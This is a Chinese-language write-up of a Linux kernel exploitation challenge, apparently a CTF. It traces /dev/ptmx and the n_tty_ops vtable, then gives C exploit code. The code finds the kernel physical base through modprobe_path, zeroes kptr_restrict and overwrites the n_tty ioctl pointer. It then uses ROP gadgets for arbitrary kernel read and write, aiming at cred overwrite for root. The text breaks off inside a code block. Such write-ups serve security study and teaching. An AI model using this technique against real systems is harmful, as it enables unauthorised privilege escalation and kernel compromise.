<h3 id="dev-ptmx"><a href="#dev-ptmx" class="headerlink" title="&#x2F;dev&#x2F;ptmx"></a>&#x2F;dev&#x2F;ptmx</h3><p>&#x2F;dev&#x2F;ptmx 是一個 特殊的字元裝置檔案，它是 Linux 系統中與 pseudo-terminal（偽終端，PTY） 有關的核心元件之一</p>
<p>簡單來說，pty的實現方法</p>
<h3 id="source-code-about-ptmx"><a href="#source-code-about-ptmx" class="headerlink" title="source code about ptmx"></a>source code about ptmx</h3><p>整個使用大致會長這樣<br>當我們 ssh 上去機器</p>
<p><img src="https://hackmd.io/_uploads/HkShZoxA1e.png" alt="image"></p>
<ul>
<li>去 open <code>/dev/ptmx</code> 分配 master&#x2F;slave 偽終端</li>
<li>&#x2F;dev&#x2F;ptmx (master) and &#x2F;dev&#x2F;pts&#x2F;N (slave) 相互通訊</li>
<li>getty &#x2F; login &#x2F; shell</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/pty.c#L873">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/pty.c#L873</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /drivers/tty/pty.c#L873</span></span><br><span class="line">	cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line">	<span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">	    register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;/dev/ptmx&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register /dev/ptmx driver&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>&#x2F;dev&#x2F;ptmx 初始化，並註冊於這段</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/pty.c#L790">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/pty.c#L790</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ptmx_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pts_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">	</span><br><span class="line">	retval = tty_alloc_file(filp);</span><br></pre></td></tr></table></figure>
<p>這邊會去 allocate 一塊 tty<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L182">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L182</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tty_alloc_file</span><span class="params">(<span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">priv</span>;</span></span><br><span class="line"></span><br><span class="line">	priv = kmalloc(<span class="keyword">sizeof</span>(*priv), GFP_KERNEL);</span><br></pre></td></tr></table></figure>
<p>展開來他會去 allocate 一塊 tty_file_private</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/include/linux/tty.h#L247">https://elixir.bootlin.com/linux/v6.14-rc4/source/include/linux/tty.h#L247</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>回到 ptmx_open()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tty = tty_init_dev(ptm_driver, index);</span><br><span class="line">tty_add_file(tty, filp);</span><br></pre></td></tr></table></figure>
<p>之後就是去 init tty deivce 跟 add file</p>
<p>這邊直接上調用鏈</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tty_open(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span><br><span class="line">	tty_alloc_file(flip)                    <span class="comment">// 分配 tty_file_private 結構體，並連結到 file-&gt;private_data</span></span><br><span class="line">	tty_open_current_tty()                 <span class="comment">// 如果不是 /dev/tty，則返回 NULL</span></span><br><span class="line">	tty_lookup_driver()                    <span class="comment">// 根據 dev_t 找到對應的 tty driver</span></span><br><span class="line">	tty_driver_lookup_tty()                <span class="comment">// 透過 driver 找出對應的 tty_struct</span></span><br><span class="line">	tty_reopen()                           <span class="comment">// 如果 tty_struct 存在，就重新開啟</span></span><br><span class="line">	tty_init_dev()                         <span class="comment">// 如果 tty_struct 不存在，就分配並初始化</span></span><br><span class="line">		alloc_tty_struct()                <span class="comment">// 分配一個 tty_struct</span></span><br><span class="line">			tty_ldisc_init()            <span class="comment">// 初始化新的 tty 的 line discipline（行紀律）結構</span></span><br><span class="line">			tty-&gt;driver = driver        <span class="comment">// 將 tty driver 連結到 tty_struct</span></span><br><span class="line">			tty-&gt;ops = driver-&gt;ops      <span class="comment">// 將 driver 操作函式設給 tty_struct</span></span><br><span class="line">		tty_driver_install_tty()        <span class="comment">// 將 tty_struct 註冊到 tty driver 中</span></span><br><span class="line">		tty_ldisc_setup()              <span class="comment">// 開啟並初始化 line discipline</span></span><br><span class="line">			tty_ldisc_open()          <span class="comment">// 呼叫行紀律的 open 函式（例如 n_tty_open）</span></span><br><span class="line">	tty_add_file()                         <span class="comment">// 將 file *filp 加入 tty_struct 的檔案列表</span></span><br><span class="line">	tty-&gt;ops-&gt;open()                       <span class="comment">// 呼叫底層驅動的 open（例如 uart_open）</span></span><br><span class="line">		tty_port_tty_set()               <span class="comment">// 將 tty_struct 與 tty_port 綁定（用於現代 tty 架構）</span></span><br><span class="line">		uart_startup()                   <span class="comment">// 啟動串列埠</span></span><br><span class="line">			uart_port_startup()         <span class="comment">// 啟動實際 UART 埠</span></span><br><span class="line">				uart_change_pm(state, UART_PM_STATE_ON)  <span class="comment">// 設定 UART 電源為 ON</span></span><br><span class="line">				get_zeroed_page()       <span class="comment">// 分配一頁清空的記憶體當作傳送緩衝區</span></span><br><span class="line">				uport-&gt;ops-&gt;startup()   <span class="comment">// 呼叫具體 UART 裝置（如 imx_startup）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="n-tty-ops"><a href="#n-tty-ops" class="headerlink" title="n_tty_ops"></a>n_tty_ops</h3><p>來看看 &#x2F;dev&#x2F;ptmx 去調用 vtable 時，是如何呼叫這張 vtable 上的 function pointer<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L2678">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L2678</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ld</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (ld-&gt;ops-&gt;ioctl) &#123;</span><br><span class="line">	retval = ld-&gt;ops-&gt;ioctl(tty, cmd, arg);</span><br></pre></td></tr></table></figure>

<p>這位置是 call ioctl 會進入的地方<br>通過 vmlinux-to-elf 提取出 vmlinux (這種方法成功保留了 debug symbol)<br>gdb vmlinux 後去 break 在 tty_ioctl 後<br>進去看到他會從 n_tty_ops + 0x38 這裡拿出 n_tty_ioctl<br><img src="https://hackmd.io/_uploads/BkMUUhxAJl.png" alt="image"></p>
<p>就是這個，所以我們找出了他調用 function pointer 的地方<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/n_tty.c#L2525">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/n_tty.c#L2525</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc_ops</span> <span class="title">n_tty_ops</span> =</span> &#123;</span><br><span class="line">	.owner		 = THIS_MODULE,</span><br><span class="line">	.num		 = N_TTY,</span><br><span class="line">	.name            = <span class="string">&quot;n_tty&quot;</span>,</span><br><span class="line">	.open            = n_tty_open,</span><br><span class="line">	.close           = n_tty_close,</span><br><span class="line">	.flush_buffer    = n_tty_flush_buffer,</span><br><span class="line">	.read            = n_tty_read,</span><br><span class="line">	.write           = n_tty_write,</span><br><span class="line">	.ioctl           = n_tty_ioctl,</span><br><span class="line">	.set_termios     = n_tty_set_termios,</span><br><span class="line">	.poll            = n_tty_poll,</span><br><span class="line">	.receive_buf     = n_tty_receive_buf,</span><br><span class="line">	.write_wakeup    = n_tty_write_wakeup,</span><br><span class="line">	.receive_buf2	 = n_tty_receive_buf2,</span><br><span class="line">	.lookahead_buf	 = n_tty_lookahead_flow_ctrl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/Byj1Onx0Jl.png" alt="image"><br>這部分是 n_tty_ioctl 被 call 的地方<br>這個 function <code>__x86_indirect_thunk_rcx</code> 會跳到 rcx 上<br>rcx 根據上面就是存 n_tty_ioctl address</p>
<p><img src="https://hackmd.io/_uploads/Hkyvuhg0yx.png" alt="image"><br>這樣就跳上去了</p>
<p>接下來來 exploit<br>我們去 overwrite n_tty_ops 的 ioctl<br>分別位在<br>n_tty_ops &#x3D; kernel physical base +　0x1eff4e0<br>ioctl &#x3D; n_tty_ops + 0x38</p>
<p><img src="https://hackmd.io/_uploads/Bk3k4pxRJg.png" alt="image"></p>
<p>我們寫上去 0xaabbccddeeff 時，kernel panic 的 error message 死在 0xaabbccddeef5<br>有我們寫上去的痕跡，表示我們已經成功 control rip 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> modprobe_start = <span class="number">0x300c6c20</span>;</span><br><span class="line"><span class="type">u_int64_t</span> tmpa = <span class="number">0x612f706d742f</span>;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_physical_base;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_virtual_base;</span><br><span class="line"><span class="type">u_int64_t</span> kptr_restrict_offset = <span class="number">0x1ff49e0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> modprobe_path_offset = <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> n_tty_ioctl_offset = <span class="number">0x1eff4e0</span> + <span class="number">0x38</span>;</span><br><span class="line"><span class="type">u_int64_t</span> w_write = <span class="number">0x1ca8000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_phy</span><span class="params">(<span class="type">u_int64_t</span> address, <span class="type">u_int64_t</span> value)</span>&#123;</span><br><span class="line">    <span class="type">char</span> command[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;/usr/sbin/chall 0x%lx 0x%lx&quot;</span>, address, value);</span><br><span class="line">    <span class="comment">// puts(&quot;[!] Try to write&quot;);</span></span><br><span class="line">    <span class="comment">// puts(command);</span></span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_modprobepath</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(buf, <span class="number">0x50</span>, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;/usr/sbin/modprobe\n&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        close(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] Find kernel physical base\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_kptr_restrict</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;cat /proc/sys/kernel/kptr_restrict&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat_kallsyms</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">u_int64_t</span> kernel_virtual_base = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;modprobe_path&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx&quot;</span>, &amp;kernel_virtual_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_virtual_base = kernel_virtual_base - modprobe_path_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_virtual_base != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Kernel Virtual base : 0x%lx\n&quot;</span>, kernel_virtual_base);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path not found\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write_phy(modprobe_start, tmpa);</span><br><span class="line">        <span class="keyword">if</span> (check_modprobepath() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical modprobe : 0x%lx\n&quot;</span>, modprobe_start);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        modprobe_start -= <span class="number">0x100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_physical_base = modprobe_start - <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical base : 0x%lx\n&quot;</span>, kernel_physical_base);</span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + kptr_restrict_offset, <span class="number">0</span>);</span><br><span class="line">    check_kptr_restrict();</span><br><span class="line">    cat_kallsyms();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==== leak end ====&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, <span class="number">0xaabbccddeeff</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;write : %lx&quot;, kernel_physical_base + w_write);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int fd = open(&quot;/dev/ptmx&quot;, O_NOCTTY | O_RDWR);</span></span><br><span class="line">    <span class="comment">// int pty_num;</span></span><br><span class="line">    <span class="comment">// ioctl(fd, TIOCGPTN, &amp;pty_num);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之前打過的題目也是通過 control ops vtable 上的 function pointer 來打 ret2usr 執行 commits_cred<br>不過看了一下題目 bzimage 的版本是 <code>v6.14-rc4</code><br>這種攻擊方式已經失效了</p>
<p>我們需要尋找別種方式來 EoP</p>
<h2 id="任意讀"><a href="#任意讀" class="headerlink" title="任意讀"></a>任意讀</h2><p>到這裡其實就會有個想法<br>我們知道每個 process (task_struct)，並且都有 struct cred 用來管理自己的權限<br>如果我們能找到自己這支 process 的 cred struct address<br>並寫掉 UID、GID<br>就可以成功提權</p>
<p>但我們要找到自己 process 的 task_struct 並不容易<br>想到的方法是通過 task_struct PID 識別</p>
<p>然後去 traverse 整條 task_struct<br>那我們就得先做出 kernel memory 任意讀</p>
<h3 id="kernel-memory-任意讀"><a href="#kernel-memory-任意讀" class="headerlink" title="kernel memory 任意讀"></a>kernel memory 任意讀</h3><p>到這裡來揭開 control rip 的用處，通過執行我們構造的 gadget<br>來做出 kernel memory 任意讀<br>其實這步我也想了非常久</p>
<p>想法是，我們去 overwrite n_tty_ioctl pointer 成 gadget<br><code>mov rax, [rdx]</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">tty_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br></pre></td></tr></table></figure>
<p>tty_ioctl 會傳入</p>
<ul>
<li>rdi : fd</li>
<li>rsi : cmd</li>
<li>rdx : arg</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld-&gt;ops-&gt;ioctl(tty, cmd, arg);</span><br></pre></td></tr></table></figure>
<p>之後去 call ops.ioctl<br>他的 rdx arg 會被傳入<br>使用這條 gadget<br>我們把 args 改成我們想要讀的 address<br>他會把上面的值給 rax</p>
<p><a target="_blank" rel="noopener" href="https://courses.cs.washington.edu/courses/cse378/10au/sections/Section1_recap.pdf">https://courses.cs.washington.edu/courses/cse378/10au/sections/Section1_recap.pdf</a></p>
<p><img src="https://hackmd.io/_uploads/S1St0VQAyg.png" alt="image"></p>
<p>根據 calling convention 可以知道 rax 還有做為存 return value 的功能<br>思考一下，我們 call ioctl 後在 kernel space 實現完功能後，會將 retval 回傳回 userspace 吧<br>那 rax 值就不應該被清空</p>
<p>所以 rax 就會被順著帶回 userspace<br>也就是執行完 ioctl 直接撈 rax 就好了</p>
<p>要找到這條 gadget 我是用 kropr<br><a target="_blank" rel="noopener" href="https://github.com/zolutal/kropr">https://github.com/zolutal/kropr</a></p>
<p>PS: 這邊就順便構造 virtual memory 的任意寫，畢竟之後用 virtual memory 比較方便，用 <code>mov [rdx], esi</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">aaw_virtual_memory_4</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_w_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_esi_to_rdx);</span><br><span class="line">    ioctl(fd, cmd, w_w_address);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小坑點的-kernel-panic"><a href="#小坑點的-kernel-panic" class="headerlink" title="小坑點的 kernel panic"></a>小坑點的 kernel panic</h3><p>當我們寫掉 ioctl 成我們自己的 gadget 時，當 exploit 跑完時，會 kernel panic<br>原因是結束 exploit 時會去 call ioctl 之類的，而原來的 gadget 所用的 <code>mov rax, [rdx]</code> 會引用到 userspace 的 address，而觸發保護</p>
<p>這份 panic 可以看到 rcx 存的是 gadget address<br>rdx userspace address<br>可以印證是 crash 在哪<br>因此 exploit 結束後記得寫回來<br><img src="https://hackmd.io/_uploads/ry0STQZAJe.png" alt="image"></p>
<p>最後將 pointer 寫回來</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">u_int64_t</span> mov_rdx_to_rax = mov_rdx_to_rax_offset + kernel_virtual_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mov_rdx_to_rax : %lx \n&quot;</span>, mov_rdx_to_rax);</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_rdx_to_rax);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit ...</span></span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, kernel_virtual_base + origin_ioctl_pointer_offset);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exploit-任意讀"><a href="#exploit-任意讀" class="headerlink" title="exploit 任意讀"></a>exploit 任意讀</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L2683">https://elixir.bootlin.com/linux/v6.14-rc4/source/drivers/tty/tty_io.c#L2683</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> retval;</span><br></pre></td></tr></table></figure>
<p>ioctl return value 是 int，所以一次只能撈 4 byte<br>所以通過 overwrite n_tty_ioctl 成我們的 gadget，讓 rdx address 上的 value 給 rax，通過 calling convention，rax 是 return value 不會被清掉，就可以撈出 kernel memory 上的 value 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 